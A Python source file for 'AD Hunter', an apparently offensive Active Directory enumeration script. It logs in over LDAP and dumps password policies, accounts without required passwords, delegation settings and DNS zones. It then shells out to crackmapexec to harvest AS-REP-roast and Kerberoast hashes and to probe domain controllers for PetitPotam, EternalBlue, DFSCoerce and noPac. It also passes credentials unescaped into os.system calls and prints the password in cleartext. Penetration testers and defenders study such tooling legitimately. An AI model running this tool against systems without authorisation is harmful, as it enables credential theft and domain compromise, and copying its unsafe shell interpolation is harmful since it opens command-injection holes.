import ldap3
from ldap3 import *
import sys
import os
import argparse
from dns_structures import *

parser = argparse.ArgumentParser(prog="AD Hunter", description="""Active Directory Enumeration""")
parser.add_argument("domain_controller_ip", help="The IP of the domain controller targeted for enumeration")
parser.add_argument("-u", "--username", help="The username of the user for enumation purposes")
parser.add_argument("-p", "--password", help="The password of the supplied user")
parser.add_argument("-d", "--domain", help="The domain of the given user")
parser.add_argument("--ssl", help="should we try to connect with ssl")

args = parser.parse_args()

# colors from https://gist.github.com/nazwadi/ca00352cd0d20b640efd
class bcolors:
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


### Header
print(rf'''{bcolors.OKCYAN} ______  _____       __  __  __  __  __   __  ______  
/\  __ \/\  __-.    /\ \_\ \/\ \/\ \/\ "-.\ \/\__  _\ 
\ \  __ \ \ \/\ \   \ \  __ \ \ \_\ \ \ \-.  \/_/\ \/ 
 \ \_\ \_\ \____-    \ \_\ \_\ \_____\ \_\\"\_\ \ \_\ 
  \/_/\/_/\/____/     \/_/\/_/\/_____/\/_/ \/_/  \/_/ {bcolors.ENDC}''')
                                                      
print("") 
print("")                      


# TODO Check to make sure this is not being run on enviroments that are not linux

if(args.username != None and args.password == None):
	print("If a username is supplied a password must also be supplied")

if(args.username == None):
	print("Attempting Anoynomous Bind to ldap://" + args.domain_controller_ip)
	print("Checks are not performed")
	print("")
	s = Server(args.domain_controller_ip, get_info = ALL)
	c = Connection(s)
	if(not c.bind()):
		print(c.result)
		sys.exit(1)
	print(s.info)
	
	# TODO figure out if this is nessecary
	sys.exit(1)



s = Server(args.domain_controller_ip, get_info = ALL)
c = Connection(s, f"{args.domain}\\{args.username}", args.password, authentication="NTLM")

if(not c.bind()):
	print(c.result)
	sys.exit(1)

dc_informatin = s.info

## also TLS?

## Setup
default_search_base = s.info.other.get('DefaultNamingContext')[0]

save_dir = "".join(c for c in args.domain if c.isalnum() or c in [' ', '.', '_']).rstrip()

os.makedirs(f"{save_dir}/full", exist_ok=True)


### Header continued
print("")
print("Target Information")
print("=========================")
print(f"Domain Controller: {args.domain_controller_ip}, {args.domain}")
print(f"Default Context: {default_search_base}")
print(f"Username: {args.username}")
print(f"Password: {args.password}")
print(f"Output Folder: {save_dir}")
print("")

### Password Policies
print("")
print("Password Policies")
print("=========================")
print("")

#### borrowed from: https://github.com/yaap7/ldapsearch-ad
### default password policies LDAP 									(objectClass=domainDNS)
c.search(search_base=default_search_base, search_filter='(objectClass=domainDNS)', search_scope=ldap3.SUBTREE, attributes="*")

with open(f"{save_dir}/full/pass_pols.txt", "w") as f:
	f.write(str(c.response))

#TODO Color code good and bad policies
print("[+] Password Minimum Length: {}".format(c.response[0]["attributes"]["minPwdLength"]))
print("[+] Password History Length: {}".format(c.response[0]["attributes"]["pwdHistoryLength"]))
print("[+] Password Complexity: {}".format(c.response[0]["attributes"]["pwdProperties"] & 1 > 0))
print("[+] Lockout Threshold: {}".format(c.response[0]["attributes"]["lockoutThreshold"]))
print("[+] Lockout Duration: {}".format(c.response[0]["attributes"]["lockoutDuration"]))



### fine grain password policies LDAP 									(objectClass=MsDS-PasswordSettings)


##### LAPS in use? Every user should be able to see the AdmPwdExpiration attribute			Check for 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DOMAIN' DOMAIN schema should be in s.info
laps_use = c.search(search_base=s.info.other.get('SchemaNamingContext')[0], search_filter='(cn=ms-mcs-AdmPwdExpirationTime)', search_scope=ldap3.SUBTREE, attributes="*")

print("[+] LAPS installed: {}".format(laps_use))
print("")
print("Full password information dump saved to pass_pols.txt")
print("")

### User Enumerations
print("")
print("User Enumerations")
print("=========================")
print("")

##### Users with descriptions -> output to file (print number found)					(&(objectClass=user)(description=*))
c.search(search_base=default_search_base, search_filter='(&(objectClass=user)(description=*))', search_scope=ldap3.SUBTREE, attributes="*")

count = 0
with open(f"{save_dir}/full/users_dcsrp_full.txt", "w") as f:
	f.write(str(c.response))
	
with open(f"{save_dir}/users_dcsrp.txt", "w") as f:
	for i in range(len(c.response)):
		if(c.response[i]["type"] == "searchResEntry"):
			f.write(str(c.response[i]["attributes"]["name"]) + ": " + str(c.response[i]["attributes"]["description"]) + "\n")
			count += 1

print("[+] Found {} users with descriptions".format(count))


##### Users without a password set -> output to file (print number found)				(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))

c.search(search_base=default_search_base, search_filter='(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))', search_scope=ldap3.SUBTREE, attributes="*")

count = 0
with open(f"{save_dir}/users_no_req_pass.txt", "w") as f:
	for i in range(len(c.response)):
		if(c.response[i]["type"] == "searchResEntry"):
			f.write(str(c.response[i]["attributes"]["name"]) + "\n")
			count += 1
	
with open(f"{save_dir}/full/users_no_req_pass_full.txt", "w") as f:
	f.write(str(c.response))
	
print("[+] Found {} users without required passwords".format(count))


##### Users where ASP-REP roasting is possible
####### Retrieve tickets -> output to file
# TODO FIX
# TODO change for dependance on auth method
print(f"[+] Performing {bcolors.PURPLE}CME{bcolors.ENDC} ASREProasting")  
os.system(f"crackmapexec ldap {args.domain_controller_ip} --kdcHost {args.domain_controller_ip} -u {args.username} -p {args.password} --asreproast {save_dir}/users_asreproast.txt")
print("")

######## Option to crack hashes in background

##### Users where Kerberoasting is possible
####### Retrieve tickets -> output to file

# TODO FIX
# TODO change for dependance on auth method
print(f"[+] Performing {bcolors.PURPLE}CME{bcolors.ENDC} kerberoasting")  
os.system(f"crackmapexec ldap {args.domain_controller_ip} --kdcHost {args.domain_controller_ip} -u {args.username} -p {args.password} --kerberoasting {save_dir}/users_kerberoasting.txt")
print("")
######## Option to crack hashes in background?

print("")
print(f"Files saved in {save_dir} as users_*.txt")

print("")
print("Delegation Enumeration")
print("=========================")
print("")


##### All objects with trusted for delegation -> output to file     					(userAccountControl:1.2.840.113556.1.4.803:=524288)
c.search(search_base=default_search_base, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', search_scope=ldap3.SUBTREE, attributes="*")

with open(f"{save_dir}/full/objects_unconstrained_delegation_full.txt", "w") as f:
	f.write(str(c.response))
	
count = 0
with open(f"{save_dir}/delegation_unconstrained_objects.txt", "w") as f:
	for i in range(len(c.response)):
		if(c.response[i]["type"] == "searchResEntry"):
			f.write(str(c.response[i]["attributes"]["samaccountname"]) + "\n")
			count += 1

print("[+] Found: {} AD Objects with Unconstrained Delegations".format(count))


##### All objects with trusted for auth delegation -> output to file     					(userAccountControl:1.2.840.113556.1.4.803:=16777216)
c.search(search_base=default_search_base, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=16777216)', search_scope=ldap3.SUBTREE, attributes="*")

with open(f"{save_dir}/full/objects_constrained_delegation_full.txt", "w") as f:
	f.write(str(c.response))
	
count = 0
with open(f"{save_dir}/delegation_constrained_objects.txt", "w") as f:
	f.write("SamAccountName: {objects that account can delegate for}\n")
	f.write("====================================================================\n")
	for i in range(len(c.response)):
		if(c.response[i]["type"] == "searchResEntry"):
			f.write(str(c.response[i]["attributes"]["samaccountname"]) + ": " + str(c.response[i]["attributes"]["msDS-AllowedToDelegateTo"]) + "\n")
			count += 1

print("[+] Found: {} AD Objects with Constrained Delegations".format(count))


print("")
print(f"Files saved in {save_dir} as delegation_*.txt")

print("")

print("")
print("AD DNS Enumeration")
print("=========================")
print("")

# alot borrowed from adidnsdump, but updated to include more DNS record types
domainroot = s.info.other['defaultNamingContext'][0]
forestroot = s.info.other['rootDomainNamingContext'][0]

zones = set()

c.search(search_base=f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])

for entry in c.response:
    if entry['type'] != 'searchResEntry':
        continue

    zones.add(f"DC={entry['attributes']['dc']},CN=MicrosoftDNS,DC=DomainDnsZones,{domainroot}")


c.search(search_base=f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])

for entry in c.response:
    if entry['type'] != 'searchResEntry':
        continue

    zones.add(f"DC={entry['attributes']['dc']},CN=MicrosoftDNS,DC=ForestDnsZones,{forestroot}")

c.search(search_base=f"CN=MicrosoftDNS,CN=System,{domainroot}" , search_filter='(objectClass=dnsZone)', search_scope=LEVEL, attributes=['dc'])

for entry in c.response:
    if entry['type'] != 'searchResEntry':
        continue

    zones.add(f"DC={entry['attributes']['dc']},CN=MicrosoftDNS,CN=System,{domainroot}")

# we need to save some records in memory for use in converting domain controllers to ips
A_records = [] # probably should add support for IPv6 #TODO

with open(f"{save_dir}/ad_dns_dump.txt", "w") as f:
	for zone in zones:
		num_records = 0
		f.write(zone)
		f.write("\n\n")
		c.extend.standard.paged_search(f'{zone}', "(objectClass=*)", search_scope=LEVEL, attributes=['dnsRecord','dNSTombstoned','name'], paged_size=500, generator=False)
		
		for entry in c.response:
			if entry['type'] != 'searchResEntry':
				f.write(str(entry))
				f.write("\n")
				continue
		
			for record in entry["raw_attributes"]["dnsRecord"]:
				dr = DNS_RECORD(record)
				num_records += 1

				queryType = RECORD_TYPE_MAPPING[dr['Type']]
				recordname = entry["attributes"]["name"]
				
				# spent too many hours looking at this already, you can add types from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/ac793981-1c60-43b8-be59-cdbb5c4ecb8a
				# identification for all record types is already configured, just not structures and exporting
				if queryType == 'ZERO':
					data = DNS_RPC_RECORD_TS(dr["Data"])
					f.write(str({'name': recordname, 'type': queryType, 'value': data.dump()}))
					f.write("\n")
				elif queryType == 'A':
					data = DNS_RPC_RECORD_A(dr["Data"])
					record_mapped = {'name':recordname, 'type': queryType, 'value': data.formatCanonical()}
					A_records.append(record_mapped)
					f.write(str(record_mapped))
					f.write("\n")
				elif queryType in ['NS', 'PTR', 'CNAME']:
					data = DNS_RPC_RECORD_NODE_NAME(dr["Data"])
					f.write(str({'name':recordname, 'type': queryType, 'value': data[list(data.fields)[0]].toFqdn()}))
					f.write("\n")
				elif queryType == 'TXT':
					data = DNS_RPC_RECORD_STRING(dr["Data"])
					f.write(str({'name':recordname, 'type': queryType, 'value': data[list(data.fields)[0]]}))
					f.write("\n")               
				elif queryType == 'SRV':
					data = DNS_RPC_RECORD_SRV(dr["Data"])
					f.write(str({'name':recordname, 'type': queryType, 'value': data[list(data.fields)[3]].toFqdn()}))
					f.write("\n")
				elif queryType == 'AAAA':
					data = DNS_RPC_RECORD_AAAA(dr["Data"])
					f.write(str({'name':recordname, 'type': queryType, 'value': data.formatCanonical()}))
					f.write("\n")
				else:
					f.write("=======UNKNOWN DNS RECORD=======\n")
					f.write(f'name: {recordname}, type: {queryType}\n')
					f.write('Dump: ')
					f.write(str(dr.getData()))
					f.write("\n")
					f.write("================================\n")
		
		print(f"Found zone: {zone}: with {num_records} records")			

print("")
print(f"AD DNS Dumping saved to {save_dir}/ad_dns_dump.txt")

### Domain controllers identifications
print("")
print("Domain Controller Scanning")
print("=========================")
print("")
# get all NTDSDSA objects, only domain controllers run this service
c.search(search_base=s.info.other.get('ConfigurationNamingContext')[0], search_filter='(objectClass=nTDSDSA)', search_scope=ldap3.SUBTREE, attributes="*")


results = c.response 
for i in range(len(results)):
	if(results[i]["type"] == "searchResEntry"):
		dName = results[0]["attributes"]["distinguishedName"]

		objectBase = dName[dName.index(",")+1:] # get the Parent CN=Child,CN=Parent,....DC=EXAMPLE,DC=NET

		c.search(search_base=objectBase, search_filter='(objectClass=*)', search_scope=ldap3.BASE, attributes="*")

		#should only return one response if we did it right
		domain_controller_name = c.response[0]['attributes']['name']

		print(f"[+] Found {domain_controller_name}")

		# prevents duplicates in a messy way
		vals = list(set([x["value"] for x in A_records if x["name"].lower() == domain_controller_name.lower()]))

		if(len(vals) == 0):
			print(f"DNS search revealed no IPs for {domain_controller_name}")
			print("Skipping Vuln testing for this DC")
			continue
		
		print(f"DNS search revealed the following IPs for {domain_controller_name}:")
		print(f"Please select the number of the IP which you would like to use:")

		for ip_num in range(len(vals)):
			print(f"[{ip_num}] {vals[ip_num]}")

		print(f"[{ip_num+1}] Don't use any of these (skips testing)")

		selected_ip = int(input(": "))
		

		if(selected_ip == ip_num+1):
			print("Skipping Vuln testing for this DC")
			continue
		elif(not selected_ip in range(len(vals))): #could make this loop
			print("Unknown Input, Skipping Vuln testing for this DC") 
			continue
		else:
			print(f"[*] Runinng {bcolors.PURPLE}NMAP{bcolors.ENDC} SMB Signing Scan for {domain_controller_name} ")
			os.system(f"nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 {vals[selected_ip]}")
			print("")

			print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} LDAP Signing Scan for {domain_controller_name}, with creds {args.username}:{args.password}")
			os.system(f"crackmapexec ldap {vals[selected_ip]} -u '{args.username}' -p '{args.password}' -M ldap-checker")
			print("")

			print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Petitpotam Scan for {domain_controller_name}")
			os.system(f"crackmapexec smb {vals[selected_ip]} -u '' -p '' -M petitpotam")
			print("")
			
			print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} EternalBlue Scan for {domain_controller_name}")
			os.system(f"crackmapexec smb {vals[selected_ip]} -u '' -p '' -M ms17-010")
			print("")
			
			print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} DFSCoerce Scan for {domain_controller_name}")
			os.system(f"crackmapexec smb {vals[selected_ip]} -u '' -p '' -M dfscoerce")
			print("")
			
			
			""" TODO Zerologon is broken and does not close crackmapexec after completing """
			""" print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} Zerologon Scan for {domain_controller_name}")
			os.system(f"crackmapexec smb {vals[selected_ip]} -u '' -p '' -M zerologon")
			os.system(f"pkill crackmapexec")
			print("") """
			

			#TODO this is dependant on authentication type
			print(f"[*] Runinng {bcolors.PURPLE}CME{bcolors.ENDC} NoPac Scan for {domain_controller_name}, with creds {args.username}:{args.password}")
			os.system(f"crackmapexec smb {vals[selected_ip]} -u '{args.username}' -p '{args.password}' -M nopac")
			print("")


print("")
print("System Scanning")
print("=========================")
print("")
